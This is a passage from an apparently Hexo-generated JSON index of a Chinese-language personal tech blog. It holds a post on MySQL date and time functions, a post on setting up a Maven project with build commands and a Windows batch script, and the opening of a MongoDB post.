target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 5.5 Reference Manual :: 12.7 Date and Time Functions</a></p>\n<p><code>UNIX_TIMESTAMP()</code>可以用between…and做比較</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/20642626/unix-timestamp-comparison\" target=\"_blank\" rel=\"noopener\">mysql - UNIX_TIMESTAMP() comparison - Stack Overflow</a></li>\n</ul>\n<h3 id=\"UNIX-TIMESTAMP-lt-gt-FROM-UNIXTIME\"><a href=\"#UNIX-TIMESTAMP-lt-gt-FROM-UNIXTIME\" class=\"headerlink\" title=\"UNIX_TIMESTAMP()&lt;==&gt;FROM_UNIXTIME()\"></a>UNIX_TIMESTAMP()&lt;==&gt;FROM_UNIXTIME()</h3><p><code>UNIX_TIMESTAMP()</code>產生UNIX時間戳記<br><code>FROM_UNIXTIME()</code>轉一般時間標記(xxxx-xx-xx oo:oo:oo)</p>\n<h3 id=\"DATEDIFF-‘2015-09-28-21-00-01’-’2015-08-31-13-00-01’\"><a href=\"#DATEDIFF-‘2015-09-28-21-00-01’-’2015-08-31-13-00-01’\" class=\"headerlink\" title=\"DATEDIFF(‘2015-09-28 21:00:01’,’2015-08-31 13:00:01’);\"></a>DATEDIFF(‘2015-09-28 21:00:01’,’2015-08-31 13:00:01’);</h3><p>算出差幾天<br>帶進去參數不一定要DATETIME格式<br>UNIX_TIMESTAMP也可以</p>\n<h3 id=\"TIMEDIFF-‘2015-09-28-21-00-01’-’2015-09-28-13-23-11’\"><a href=\"#TIMEDIFF-‘2015-09-28-21-00-01’-’2015-09-28-13-23-11’\" class=\"headerlink\" title=\"TIMEDIFF(‘2015-09-28 21:00:01’,’2015-09-28 13:23:11’)\"></a>TIMEDIFF(‘2015-09-28 21:00:01’,’2015-09-28 13:23:11’)</h3><p>算出差幾秒，傳回時間格式(datetime)<br><a href=\"https://stackoverflow.com/questions/3528219/mysql-how-to-get-the-difference-between-two-timestamps-in-seconds/3528228#3528228\" target=\"_blank\" rel=\"noopener\">php - MySQL: how to get the difference between two timestamps in seconds - Stack Overflow</a></p>\n<p><strong>不同於一般DB2和Oracle資料庫用法</strong></p>\n<p><a href=\"https://www.w3schools.com/sql/trymysql.asp?filename=trysql_func_mysql_timediff2\" target=\"_blank\" rel=\"noopener\">MySQL Tryit Editor v1.0</a><br>可用MySQL函式,day(),month()….來做判斷幾天或幾個月</p>\n<ul>\n<li><a href=\"http://newaurora.pixnet.net/blog/post/204336313-%E4%BD%BF%E7%94%A8mysql%E6%99%82%E9%96%93%E5%87%BD%E6%95%B8%28function%29%E8%BD%89%E6%8F%9Bunix%E6%99%82%E9%96%93%E6%88%B3%E8%A8%98%E8%88%87\" target=\"_blank\" rel=\"noopener\">使用MySQL時間函數(function)轉換UNIX時間戳記與時間加減 @ 史丹利愛碎念 :: 痞客邦 ::</a></li>\n</ul>\n<h3 id=\"TIMESTAMPDIFF-DAY-’2015-09-28-21-00-01’-’2015-09-28-13-23-11’\"><a href=\"#TIMESTAMPDIFF-DAY-’2015-09-28-21-00-01’-’2015-09-28-13-23-11’\" class=\"headerlink\" title=\"TIMESTAMPDIFF(DAY,’2015-09-28 21:00:01’,’2015-09-28 13:23:11’)\"></a>TIMESTAMPDIFF(DAY,’2015-09-28 21:00:01’,’2015-09-28 13:23:11’)</h3><p><a href=\"https://stackoverflow.com/questions/2174058/mysql-timediff-to-hours\" target=\"_blank\" rel=\"noopener\">php - mysql timediff to hours - Stack Overflow</a></p>\n<h3 id=\"to-days-lt-gt-from-days\"><a href=\"#to-days-lt-gt-from-days\" class=\"headerlink\" title=\"to_days&lt;=&gt;from_days\"></a>to_days&lt;=&gt;from_days</h3><p>to_days()傳回天數數字<br>+1就是加1天</p>\n<p>看範例比較快<br><a href=\"http://sanujpblue.blogspot.tw/2014/12/mysql.html\" target=\"_blank\" rel=\"noopener\">糯米玩PC: MySql 按日期進行統計</a><br><a href=\"http://282120928-qq-com.iteye.com/blog/1289492\" target=\"_blank\" rel=\"noopener\">TO_DAYS日期函数 - 我的地盘 - ITeye博客</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT from_days(to_days(now())+1);</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://www.w3schools.com/sql/trymysql.asp?filename=trysql_func_mysql_from_days\" target=\"_blank\" rel=\"noopener\">MySQL Tryit Editor v1.0</a><br>直接試比較快懂，我爬了很久<br>以為是UNIX_TIMESTAMP….<strong>但不是</strong></p>\n<h3 id=\"time-to-sec-lt-gt-sec-to-time\"><a href=\"#time-to-sec-lt-gt-sec-to-time\" class=\"headerlink\" title=\"time_to_sec&lt;=&gt;sec_to_time\"></a>time_to_sec&lt;=&gt;sec_to_time</h3><p>用時間格式轉乘秒，可以超過24小時<br>(感覺能用在UNIX_TIMESTAMP運算上面)</p>\n<p><a href=\"https://www.w3schools.com/sql/func_mysql_time_to_sec.asp\" target=\"_blank\" rel=\"noopener\">MySQL TIME_TO_SEC() Function</a></p>\n<ul>\n<li><a href=\"http://fecbob.pixnet.net/blog/post/39089591-mysql%E6%97%A5%E6%9C%9F%E6%99%82%E9%96%93%E5%87%BD%E6%95%B8%E5%A4%A7%E5%85%A8\" target=\"_blank\" rel=\"noopener\">MySQL日期時間函數大全 @ 資訊園 :: 痞客邦 ::</a></li>\n<li><a href=\"https://stackoverflow.com/questions/3651985/compare-dates-in-mysql\" target=\"_blank\" rel=\"noopener\">sql - Compare dates in MySQL - Stack Overflow</a></li>\n<li><a href=\"https://www.jianshu.com/p/59dfdb9918cd\" target=\"_blank\" rel=\"noopener\">MYSQL时间函数 - 简书</a></li>\n<li><a href=\"https://stackoverflow.com/questions/13402012/select-row-by-datepart\" target=\"_blank\" rel=\"noopener\">mysql - SELECT row by DATEPART() - Stack Overflow</a></li>\n</ul>\n<h3 id=\"MySQL跟DB2-差異寫法\"><a href=\"#MySQL跟DB2-差異寫法\" class=\"headerlink\" title=\"MySQL跟DB2 差異寫法\"></a>MySQL跟DB2 差異寫法</h3><p>回憶以前用db2的時候</p>\n<p><a href=\"http://www.th7.cn/db/mysql/201712/260897.shtml\" target=\"_blank\" rel=\"noopener\">项目中用到过的MYSQ和DB2的部分函数转化 （zxz）<em>MySQL</em>第七城市</a><br><a href=\"https://hackmd.io/iQcvSsh_Td6T6oxDjwWXew?view\" target=\"_blank\" rel=\"noopener\">https://hackmd.io/iQcvSsh_Td6T6oxDjwWXew?view</a><br>備份用…<br><a href=\"https://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_quarter\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 5.5 Reference Manual :: 12.7 Date and Time Functions</a></p>\n<h3 id=\"UNIX-TIMESTAMP-時間加法運算\"><a href=\"#UNIX-TIMESTAMP-時間加法運算\" class=\"headerlink\" title=\"UNIX_TIMESTAMP 時間加法運算\"></a>UNIX_TIMESTAMP 時間加法運算</h3><p>select now() +  INTERVAL 5 HOUR</p>\n<p><code>now()</code>跟<code>CURRENT_TIMESTAMP</code>是一樣的</p>\n<p>很常看到都是用DATETIME型態做運算</p>\n<p>datetime運算其實有<code>DATE_ADD</code>和<code>DATE_SUB</code></p>\n<blockquote>\n<p>DATE_ADD和DATE_SUB其實可以通用，因為expr可以為一個負數。<br>其實很簡單，一個是用加一個是減，不過…DATE_ADD(xxx, - INTERVAL 5 MINUNT) 可以用負數</p>\n</blockquote>\n<p>最後，感覺能用在TIME_TO_SEC用在運算上面<br>但不知道網路上很少這樣用</p>\n<h3 id=\"小心效能\"><a href=\"#小心效能\" class=\"headerlink\" title=\"小心效能\"></a>小心效能</h3><h1 id=\"MySQL裡的NOW-與UNIX-TIMESTAMP\"><a href=\"#MySQL裡的NOW-與UNIX-TIMESTAMP\" class=\"headerlink\" title=\"MySQL裡的NOW()與UNIX_TIMESTAMP()\"></a>MySQL裡的NOW()與UNIX_TIMESTAMP()</h1><p>date(欄位) = xxx 很吃效能<br>盡量用 WHERE <code>date</code> &gt;= ‘2010-10-01’ AND <code>date</code> &lt; ‘2010-11-01’</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/14849911/difference-between-unix-timestamp-and-now-in-mysql\" target=\"_blank\" rel=\"noopener\">date - Difference between UNIX_TIMESTAMP and NOW() in MySQL - Stack Overflow</a></li>\n<li><a href=\"https://blog.csdn.net/qq2712193/article/details/48766575\" target=\"_blank\" rel=\"noopener\">mysql中日期比较大小的方法 - CSDN博客</a></li>\n<li><a href=\"https://stackoverflow.com/questions/2758486/mysql-compare-date-string-with-string-from-datetime-field/17169859#17169859\" target=\"_blank\" rel=\"noopener\">MySQL compare DATE string with string from DATETIME field - Stack Overflow</a></li>\n<li><a href=\"http://www.piaoyi.org/database/MYSQL-INT-TIMESTAMP-DATETIME.html\" target=\"_blank\" rel=\"noopener\">MYSQL数据库时间字段INT,TIMESTAMP,DATETIME性能效率比较</a></li>\n<li><a href=\"https://stackoverflow.com/questions/4233095/how-to-optimize-date-time-search-in-mysql\" target=\"_blank\" rel=\"noopener\">datetime - How to optimize date time search in Mysql? - Stack Overflow</a></li>\n<li><a href=\"http://www.cnblogs.com/hongfei/archive/2012/06/08/2541599.html\" target=\"_blank\" rel=\"noopener\">MySQL中的UNIX_TIMESTAMP函数使用总结 - 曾是土木人 - 博客园</a></li>\n</ul>\n<p>where DATE(<code>time_stamp</code>) = DATE(now());</p>\n<p>用在欄位很吃效能，可能會造成full scan<br>datetime要怎麼比較今天呢??<br>這個我相信很常用<br>有找到這個<br><code>WHERE startTime &gt;= &#39;2010-04-29&#39; AND startTime &lt; (&#39;2010-04-29&#39; + INTERVAL 1 DAY)</code><br><a href=\"https://stackoverflow.com/questions/2758486/mysql-compare-date-string-with-string-from-datetime-field/17169859#17169859\" target=\"_blank\" rel=\"noopener\">MySQL compare DATE string with string from DATETIME field - Stack Overflow</a><br>可以參考上面第二個解答<br>對非欄位做轉換比較不會吃資源<br>雖然不知道為什麼最佳解答是第一個吃效能的<br>呵呵</p>\n<p>相信可能還有更好用的<br>可能我沒有記錄到<br>不過我相信我應該會很常回來看這篇</p>\n<p>參考來源:</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/13064516/selecting-rows-in-the-last-5-minutes-using-unix-time-stamp\" target=\"_blank\" rel=\"noopener\">mysql - selecting rows in the last 5 minutes using unix time stamp - Stack Overflow</a></li>\n<li><a href=\"https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_addtime\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 8.0 Reference Manual :: 12.7 Date and Time Functions</a></li>\n<li><a href=\"https://dba.stackexchange.com/questions/63548/difference-between-now-and-current-timestamp\" target=\"_blank\" rel=\"noopener\">sql - Difference between now() and current_timestamp - Database Administrators Stack Exchange</a></li>\n<li><a href=\"https://stackoverflow.com/questions/28315254/difference-between-sysdate-now-current-timestamp-current-timestamp-in-mysq\" target=\"_blank\" rel=\"noopener\">database - Difference between SYSDATE(),NOW(),CURRENT_TIMESTAMP,CURRENT_TIMESTAMP() in MySQL? - Stack Overflow</a></li>\n<li><a href=\"http://www.cnblogs.com/drcoding/p/4624851.html\" target=\"_blank\" rel=\"noopener\">MySQL系统时间函数NOW(),CURRENT_TIMESTAMP(),SYSDATE()的区别 - Qiurf - 博客园</a></li>\n</ul>\n","categories":["MySQL"],"tags":["MySQL","UNIX_TIMESTAMP","to_days"]},{"title":"Maven 建置專案初體驗","url":"/blog/2020/06/15/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/","content":"<p>最近工作機會難得，有空摸 maven<br>沒想到想說簡單的建置小專案<br>就遇到一堆雷<br>在這邊筆記</p>\n<a id=\"more\"></a>\n<h2 id=\"安裝\"><a href=\"#安裝\" class=\"headerlink\" title=\"安裝\"></a>安裝</h2><p>我用 chocolate 安裝</p>\n<p>安裝可參考:<br><a href=\"https://linuxize.com/post/how-to-install-apache-maven-on-ubuntu-18-04/\" target=\"_blank\" rel=\"noopener\">How to Install Apache Maven on Ubuntu 18.04 | Linuxize</a></p>\n<h2 id=\"請不要使用-Powershell\"><a href=\"#請不要使用-Powershell\" class=\"headerlink\" title=\"請不要使用 Powershell!!\"></a>請不要使用 Powershell!!</h2><p><strong>請不要使用 Powershell!!</strong><br><strong>請不要使用 Powershell!!</strong><br><strong>請不要使用 Powershell!!</strong></p>\n<p>很重要，所以我說三遍</p>\n<p>就算用爛爛的 cmd ，也不要浪費大量時間處理 powershell </p>\n<p>好像是 Powershell -D 會有問題<br>我就沒有詳細研究了</p>\n<p><a href=\"https://blog.csdn.net/wushengjun753/article/details/78973618?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase\" target=\"_blank\" rel=\"noopener\">【坑】【maven】在PowerShell窗口下执行maven命令行报错：Unknown lifecycle phase .test.skip=true._三年小白的博客-CSDN博客</a></p>\n<p>用 Powershell Script 大概會看到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[ERROR] Unknown lifecycle phase &quot;/home/tucson/Projects/kafkaGuideTest/target/Getting-Started-0.0.1-SNAPSHOT.jar&quot;. You must specify a valid lifecycle phase or a goal in the format &lt;plugin-prefix&gt;:&lt;goal&gt; or &lt;plugin-group-id&gt;:&lt;plugin-artifact-id&gt;[:&lt;plugin-version&gt;]:&lt;goal&gt;. Available lifecycle phases are: validate, initialize, generate-sources, process-sources, generate-resources, process-resources, compile, process-classes, generate-test-sources, process-test-sources, generate-test-resources, p rocess-test-resources, test-compile, process-test-classes, test, prepare-package, package, pre-integration-test, integration-test, post-integration-test, verify, install, deploy, pre-site, site, post-site, site-deploy, pre-clean, clean, post-clean. -&gt; [Help 1]</span><br></pre></td></tr></table></figure>\n<p>但絕非你的指令錯誤</p>\n<h2 id=\"建置-Maven\"><a href=\"#建置-Maven\" class=\"headerlink\" title=\"建置 Maven\"></a>建置 Maven</h2><h3 id=\"建置新專案\"><a href=\"#建置新專案\" class=\"headerlink\" title=\"建置新專案\"></a>建置新專案</h3><p>mvn archetype:create</p>\n<p>Choose archetype:     選擇建立Project的範本，預設是99:maven-archetype-quickstart建立一個最基本的Project<br>Choose version:     選擇範本的版本，會列出一些範本可用的版本，其差異是就不用版本的範本可能會建立有不同的資源檔(比如可能附帶圖檔)<br>定義groupId:     輸入要建立Project所隸屬的組織或公司，如我自已用idv.kentyeh.software<br>定義artifactId:     就是Project名稱，例如 firstMaven<br>定義version:     Project的版本號，預設是1.0-SNAPSHOT<br>定義package:     初始建立的Java Package, 如 idv.kentyeh.software</p>\n<h4 id=\"Archetype有哪些\"><a href=\"#Archetype有哪些\" class=\"headerlink\" title=\"Archetype有哪些\"></a>Archetype有哪些</h4><blockquote>\n<p>Archetype ArtifactIds    說明<br>maven-archetype-archetype    產生Archetype專案<br>maven-archetype-j2ee-simple    產生簡單的J2EE專案<br>maven-archetype-plugin    產生Maven plugin專案<br>maven-archetype-plugin-site    產生Maven plugin site專案<br>maven-archetype-portlet    產生JSR-268 Portlet專案<br>maven-archetype-profiles<br>maven-archetype-quickstart    產生簡單的Maven專案<br>maven-archetype-site    產生Maven site專案<br>maven-archetype-site-simple    產生簡單的Maven site專案<br>maven-archetype-webapp    產生Maven Web App專案</p>\n<p>以上最常使用maven-archetype-quickstart建立簡單的Maven專案，<br>及使用maven-archetype-webapp建立Maven Web專案，剩下的很少用（我個人沒用過）。</p>\n</blockquote>\n<p><a href=\"https://matthung0807.blogspot.com/2019/07/maven-archetype.html\" target=\"_blank\" rel=\"noopener\">菜鳥工程師 肉豬: Maven 什麼是Archetype</a></p>\n<p><a href=\"https://blog.csdn.net/snowin1994/article/details/53024871\" target=\"_blank\" rel=\"noopener\">maven中的groupId和artifactId到底指的是什么？_孙雪峰-CSDN博客</a></p>\n<h3 id=\"一種快速輸入建置方法\"><a href=\"#一種快速輸入建置方法\" class=\"headerlink\" title=\"一種快速輸入建置方法\"></a>一種快速輸入建置方法</h3><p>maven-archetype-quickstart (Java Project)</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mvn archetype:generate -DgroupId=com.yiibai.core -DartifactId=ProjectName -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=<span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n<p>maven-archetype-webapp (Java Web Project)</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mvn archetype:generate -DgroupId=com.yiibai.web -DartifactId=ProjectName -DarchetypeArtifactId=maven-archetype-webapp -DinteractiveMode=<span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n<p>作者：park<br>链接：<a href=\"https://juejin.im/post/5a1e1f76f265da432b4a92cb\" target=\"_blank\" rel=\"noopener\">https://juejin.im/post/5a1e1f76f265da432b4a92cb</a><br>来源：掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>\n<p>題外話:<br><a href=\"https://kentyeh.github.io/mavenStartup/index.html\" target=\"_blank\" rel=\"noopener\">Mave教學 | Maven 初學者中文教程</a><br>mvn archetype:create 我沒辦法使用…</p>\n<h2 id=\"加入依賴套件\"><a href=\"#加入依賴套件\" class=\"headerlink\" title=\"加入依賴套件\"></a>加入依賴套件</h2><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>junit<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>junit<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>4.11<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">   <span class=\"comment\">&lt;!-- https://mvnrepository.com/artifact/commons-httpclient/commons-httpclient --&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>commons-httpclient<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>commons-httpclient<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"> <span class=\"comment\">&lt;!-- https://mvnrepository.com/artifact/com.google.code.gson/gson --&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.google.code.gson<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>gson<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.2.4<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"> <span class=\"comment\">&lt;!-- https://mvnrepository.com/artifact/net.sf.json-lib/json-lib --&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>net.sf.json-lib<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>json-lib<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>0.9<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"編譯-Java\"><a href=\"#編譯-Java\" class=\"headerlink\" title=\"編譯 Java\"></a>編譯 Java</h2><p>mvn compile</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[INFO] Scanning for projects...</span><br><span class=\"line\">[INFO] </span><br><span class=\"line\">[INFO] ---------------------------&lt; sample:sample &gt;----------------------------</span><br><span class=\"line\">[INFO] Building sample 1.0-SNAPSHOT</span><br><span class=\"line\">[INFO] --------------------------------[ jar ]---------------------------------</span><br><span class=\"line\">[INFO] </span><br><span class=\"line\">[INFO] --- maven-resources-plugin:3.0.2:resources (default-resources) @ sample ---</span><br><span class=\"line\">[INFO] Using &apos;UTF-8&apos; encoding to copy filtered resources.</span><br><span class=\"line\">[INFO] skip non existing resourceDirectory /home/xxx/sample/src/main/resources</span><br><span class=\"line\">[INFO] </span><br><span class=\"line\">[INFO] --- maven-compiler-plugin:3.8.0:compile (default-compile) @ sample ---</span><br><span class=\"line\">[INFO] Nothing to compile - all classes are up to date</span><br><span class=\"line\">[INFO] ------------------------------------------------------------------------</span><br><span class=\"line\">[INFO] BUILD SUCCESS</span><br><span class=\"line\">[INFO] ------------------------------------------------------------------------</span><br><span class=\"line\">[INFO] Total time:  1.488 s</span><br><span class=\"line\">[INFO] Finished at: 2020-06-15T20:30:00+08:00</span><br><span class=\"line\">[INFO] ------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>\n<h2 id=\"執行-Java\"><a href=\"#執行-Java\" class=\"headerlink\" title=\"執行 Java\"></a>執行 Java</h2><p>mvn exec:java -Dexec.mainClass=”sample.App”</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[INFO] Scanning for projects...</span><br><span class=\"line\">[INFO] </span><br><span class=\"line\">[INFO] ---------------------------&lt; sample:sample &gt;----------------------------</span><br><span class=\"line\">[INFO] Building sample 1.0-SNAPSHOT</span><br><span class=\"line\">[INFO] --------------------------------[ jar ]---------------------------------</span><br><span class=\"line\">[INFO] </span><br><span class=\"line\">[INFO] --- exec-maven-plugin:3.0.0:java (default-cli) @ sample ---</span><br><span class=\"line\">Hello World!</span><br><span class=\"line\">[INFO] ------------------------------------------------------------------------</span><br><span class=\"line\">[INFO] BUILD SUCCESS</span><br><span class=\"line\">[INFO] ------------------------------------------------------------------------</span><br><span class=\"line\">[INFO] Total time:  1.573 s</span><br><span class=\"line\">[INFO] Finished at: 2020-06-15T20:31:19+08:00</span><br><span class=\"line\">[INFO] ------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>\n<h2 id=\"使用-mvn\"><a href=\"#使用-mvn\" class=\"headerlink\" title=\"使用 mvn\"></a>使用 mvn</h2><p>在 win 我寫簡單 bat</p>\n<figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">call</span> mvn compile</span><br><span class=\"line\"><span class=\"keyword\">call</span> mvn exec:java -Dexec.mainClass=\"sample.ExampleGetToken\"</span><br><span class=\"line\"><span class=\"built_in\">pause</span></span><br></pre></td></tr></table></figure>\n<p>這邊我踩到一個地雷<br>mvn 前面需要加 call</p>\n<blockquote>\n<p>但是總是在執行的時候執行完一個mvn 目標後自動退出，pause命令也無效，分析原因為mvn本身是一個bat命令，因此在exit退出的時候，整個指令碼程序將退出，加入call命令呼叫即可。</p>\n</blockquote>\n<p>參考來源:<a href=\"https://codertw.com/%E5%89%8D%E7%AB%AF%E9%96%8B%E7%99%BC/388797/\" target=\"_blank\" rel=\"noopener\">呼叫maven命令的BAT指令碼分享 | 程式前沿</a></p>\n<h3 id=\"科普小知識\"><a href=\"#科普小知識\" class=\"headerlink\" title=\"科普小知識\"></a>科普小知識</h3><p>Linux 沒有 pause</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># method 1</span></span><br><span class=\"line\"><span class=\"built_in\">read</span> -n 1 -p <span class=\"string\">\"Press any key to continue...\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># method 2 </span></span><br><span class=\"line\"><span class=\"built_in\">read</span> -n 1 -p <span class=\"string\">\"Press any key to continue...\"</span> INP</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"variable\">$INP</span> != <span class=\"string\">''</span> ] ; <span class=\"keyword\">then</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> -ne <span class=\"string\">'\\b \\n'</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#! /bin/bash</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">pause</span></span>()&#123;</span><br><span class=\"line\">        <span class=\"built_in\">read</span> -n 1 -p <span class=\"string\">\"$*\"</span> INP</span><br><span class=\"line\">        <span class=\"keyword\">if</span> [ <span class=\"variable\">$INP</span> != <span class=\"string\">''</span> ] ; <span class=\"keyword\">then</span></span><br><span class=\"line\">                <span class=\"built_in\">echo</span> -ne <span class=\"string\">'\\b \\n'</span></span><br><span class=\"line\">        <span class=\"keyword\">fi</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">#使用時：</span></span><br><span class=\"line\">pause <span class=\"string\">'Press any key to continue...'</span></span><br></pre></td></tr></table></figure>\n<p>好啦，其實用 Linux 應該都是打指令呼叫程式<br>應該比較不會有 window 問題</p>\n<p>其他資源:</p>\n<ul>\n<li><a href=\"https://www.itread01.com/content/1544963239.html\" target=\"_blank\" rel=\"noopener\">bat結合maven 實現windows下maven自動打包指令碼 - IT閱讀</a></li>\n<li><a href=\"https://blog.csdn.net/wushengjun753/article/details/78973618?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase\" target=\"_blank\" rel=\"noopener\">【坑】【maven】在PowerShell窗口下执行maven命令行报错：Unknown lifecycle phase .test.skip=true._三年小白的博客-CSDN博客</a></li>\n<li><a href=\"https://blog.csdn.net/frankcheng5143/article/details/51813479\" target=\"_blank\" rel=\"noopener\">Maven创建项目时出现Generating project in Interactive mode就一直卡住的解决方案_程高伟-CSDN博客</a></li>\n<li><a href=\"https://matthung0807.blogspot.com/2019/07/maven-archetype.html\" target=\"_blank\" rel=\"noopener\">菜鳥工程師 肉豬: Maven 什麼是Archetype</a></li>\n<li><a href=\"https://juejin.im/post/5a1e1f76f265da432b4a92cb\" target=\"_blank\" rel=\"noopener\">使用Maven模板创建项目 - 掘金</a></li>\n<li><a href=\"https://amobiz.github.io/2013/12/27/integrating-maven-and-yeoman-study-notes-2-mvn-archetype-generate-jersey/\" target=\"_blank\" rel=\"noopener\">整合 Maven 與 Yeoman，學習筆記 (2) - 使用 mvn archetype:generate 建立 JAX-RS / Jersey 專案 | 格物致知</a></li>\n<li><a href=\"https://linuxize.com/post/how-to-install-apache-maven-on-ubuntu-18-04/\" target=\"_blank\" rel=\"noopener\">How to Install Apache Maven on Ubuntu 18.04 | Linuxize</a></li>\n</ul>\n","categories":["Java"],"tags":["java","mvn"]},{"title":"MonogoDB 操作使用小記","url":"/blog/2019/06/30/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/","content":"<p>最近專案有用到這個<br>有看到使用<code>Robo 3T</code><br>但對這一塊不是很了解<br>這邊主要是紀錄如何<code>操作 MonogoDB</code><br>不會記載 MonogoDB 詳細知識</p>\n<a id=\"more\"></a>\n<h2 id=\"有哪幾種-NoSQL-4-種\"><a href=\"#有哪幾種-NoSQL-4-種\" class=\"headerlink\" title=\"有哪幾種 NoSQL?(4 種)\"></a>有哪幾種 NoSQL?(4 種)</h2><ul>\n<li>Key-value store<br>ex: BigTable、Hadoop</li>\n<li>Document store<br>ex: MongoDB</li>\n<li>Graph<br>ex: Neo4J</li>\n<li>列存儲(Wide Column Store/Column-Family)資料庫(記憶體資料庫是知名網站慣用快取工具)<br>ex: Memcached、Redis、Velocity</li>\n</ul>\n<p><a href=\"https://www.ithome.com.tw/news/92507\" target=\"_blank\" rel=\"noopener\">快速認識 4 類主流 NoSQL 資料庫 | iThome</a></p>\n<h2 id=\"簡單架設-MonogoDB\"><a href=\"#簡單架設-MonogoDB\" class=\"headerlink\" 